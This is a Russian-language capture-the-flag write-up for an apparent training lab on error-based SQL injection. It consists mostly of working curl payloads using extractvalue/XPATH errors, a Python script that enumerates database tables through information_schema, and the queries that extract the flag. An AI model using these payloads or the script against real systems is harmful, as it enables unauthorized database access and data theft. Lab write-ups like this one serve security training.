
С помощью curl отправляем запрос и получим ошибку с содержанием таблицы
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "title=1' AND extractvalue(1,concat(0x3a,(SELECT concat(0x3a,table_name) FROM information_schema.tables LIMIT 0,1))) -- " http://web.aj4kmrm6p8hf2otu98jf.labs.cyber-ed.space/

![](../../attachment/Pasted%20image%2020250421221057.png)

Создаем скрипт который отправит запросы на таблицу 0-99
```import requests

# URL цели
url = "http://web.aj4kmrm6p8hf2otu98jf.labs.cyber-ed.space/"

# Заголовки запроса
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Файл для записи результатов
output_file = "results.txt"

# Открываем файл для записи
with open(output_file, "w") as file:
    # Цикл для отправки запросов с N от 0 до 99
    for n in range(100):
        # Формируем payload
        payload = f"title=1' AND extractvalue(1,concat(0x3a,(SELECT concat(0x3a,table_name) FROM information_schema.tables LIMIT {n},1))) -- "
        
        # Отправляем POST-запрос
        response = requests.post(url, headers=headers, data=payload)
        
        # Проверяем ответ на наличие ошибки XPATH syntax error
        if "XPATH syntax error" in response.text:
            # Извлекаем сообщение об ошибке
            start = response.text.find("XPATH syntax error: '") + len("XPATH syntax error: '")
            end = response.text.find("'", start)
            error_message = response.text[start:end]
            
            # Записываем результат в файл
            file.write(f"N={n}: {error_message}\n")
            print(f"N={n}: {error_message}")
        else:
            print(f"N={n}: No error found")
```
Получим результат
![](../../attachment/Pasted%20image%2020250421221213.png)

Посмотрим таблицу flag_here
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "title=1' AND extractvalue(1,concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.columns WHERE table_name='flag_here'))) -- " http://web.aj4kmrm6p8hf2otu98jf.labs.cyber-ed.space/
Находим колонку flag_column и заберем флаг с помощью двух команд (без второй команды не хватает 2 символа)

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "title=1' AND extractvalue(1,concat((SELECT concat(flag_column) FROM flag_here))) -- " http://web.aj4kmrm6p8hf2otu98jf.labs.cyber-ed.space/

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "title=1' AND extractvalue(1,concat(0x3a,(SELECT SUBSTRING(flag_column,20,1000) FROM flag_here))) -- " http://web.aj4kmrm6p8hf2otu98jf.labs.cyber-ed.space/
